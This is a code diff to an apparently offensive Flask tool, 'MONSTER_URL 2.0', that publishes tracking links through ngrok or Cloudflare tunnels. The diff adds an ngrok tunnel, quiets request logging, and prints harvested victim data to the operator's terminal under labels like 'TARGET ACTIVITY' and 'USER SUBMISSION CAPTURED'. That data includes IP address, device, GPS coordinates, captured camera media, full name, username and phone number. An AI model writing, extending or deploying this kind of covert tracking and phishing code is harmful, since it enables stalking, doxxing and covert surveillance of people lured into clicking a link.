@@ -26,6 +26,10 @@ BIN_DIR = BASE_DIR / "bin"
 MEDIA_DIR.mkdir(exist_ok=True)
 BIN_DIR.mkdir(exist_ok=True)
 
+import logging
+log = logging.getLogger("werkzeug")
+log.setLevel(logging.ERROR)
+
 app = Flask(__name__)
 app.secret_key = os.environ.get("SECRET_KEY", secrets.token_hex(32))
 
@@ -59,6 +63,11 @@ class TunnelManager(threading.Thread):
             return
 
         while True:
+            # On Termux or Linux, prioritize Ngrok if NGROK_AUTHTOKEN / pyngrok is available
+            if self.try_ngrok():
+                self.wait_and_reconnect()
+                continue
+
             # Attempt 1: Cloudflare Tunnel (cloudflared)
             if self.try_cloudflare():
                 self.wait_and_reconnect()
@@ -79,6 +88,31 @@ class TunnelManager(threading.Thread):
             TUNNEL_STATUS["error"] = "Could not establish automatic tunnel. Retrying in 10s..."
             print(f"\n[MONSTER_URL 2.0] Tunnel dropped. Retrying public tunnel connection in 10 seconds...\n")
             time.sleep(10)
+
+    def try_ngrok(self):
+        global GLOBAL_TUNNEL_URL, TUNNEL_STATUS
+        authtoken = os.environ.get("NGROK_AUTHTOKEN", "").strip()
+        if not authtoken:
+            return False
+
+        TUNNEL_STATUS["provider"] = "Ngrok Tunnel"
+        try:
+            from pyngrok import ngrok, conf
+            ngrok.set_auth_token(authtoken)
+            tunnel = ngrok.connect(self.port, "http")
+            url = tunnel.public_url.replace("http://", "https://")
+            GLOBAL_TUNNEL_URL = url
+            TUNNEL_STATUS["active"] = True
+            TUNNEL_STATUS["url"] = url
+            print(f"\n" + "="*60)
+            print(f" 🔥 MONSTER_URL 2.0 NGROK PUBLIC TUNNEL ACTIVE!")
+            print(f" 🌐 Public HTTPS URL: {url}")
+            print(f" 🛡 Provider: Ngrok Tunnel")
+            print("="*60 + "\n")
+            return True
+        except Exception as e:
+            print(f"[TunnelManager] Ngrok failed: {e}")
+            return False
 
     def wait_and_reconnect(self):
         if self.process:
@@ -577,6 +611,13 @@ def api_report(token):
         ),
     )
     db.commit()
+    
+    # Clean terminal shell logging for target activity
+    lat, lon = data.get("lat"), data.get("lon")
+    gps_str = f"{lat:.4f},{lon:.4f} (Acc: {data.get('accuracy')}m)" if lat and lon else "Pending GPS Fix"
+    dev_info = parse_user_agent(request.headers.get("User-Agent", ""))
+    print(f" [🎯 TARGET ACTIVITY] Link: {link['name']} | IP: {client_ip} | Device: {dev_info} | Location: {gps_str}")
+    
     return jsonify({"ok": True})
 
 
@@ -600,6 +641,8 @@ def api_media_upload(token):
         (link["id"], kind, fname, now_iso()),
     )
     db.commit()
+
+    print(f" [📷 MEDIA CAPTURED] Link: {link['name']} | Type: {kind.upper()} | File: {fname}")
     return jsonify({"ok": True, "filename": fname})
 
 
@@ -624,6 +667,15 @@ def api_submit_feedback(token):
         (link["id"], full_name, username, phone, opinion, now_iso()),
     )
     db.commit()
+
+    print(f"\n" + "🔥"*30)
+    print(f" 📥 [USER SUBMISSION CAPTURED!]")
+    print(f" 👤 Name     : {full_name}")
+    print(f" 📱 Username : @{username}")
+    print(f" 📞 Phone    : {phone}")
+    if opinion:
+        print(f" 💬 Details  : {opinion}")
+    print(f" 🔥"*30 + "\n")
     return jsonify({"ok": True})
 
 
